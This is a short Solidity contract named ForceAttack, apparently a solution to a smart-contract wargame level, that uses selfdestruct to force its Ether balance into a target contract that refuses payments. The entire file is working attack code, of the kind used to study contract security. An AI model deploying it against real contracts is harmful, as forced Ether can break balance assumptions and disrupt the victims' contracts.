// SPDX-License-Identifier: GPL-3.0

pragma solidity ^0.8.0;

contract ForceAttack {
    address public forceAddress;
    address public owner;

    constructor(address _addr) {
        forceAddress = _addr;
        owner = msg.sender;
    }

    receive() external payable {}

    function withdraw() external {
        require(msg.sender == owner, "Not owner");
        selfdestruct(payable(forceAddress));
    }
}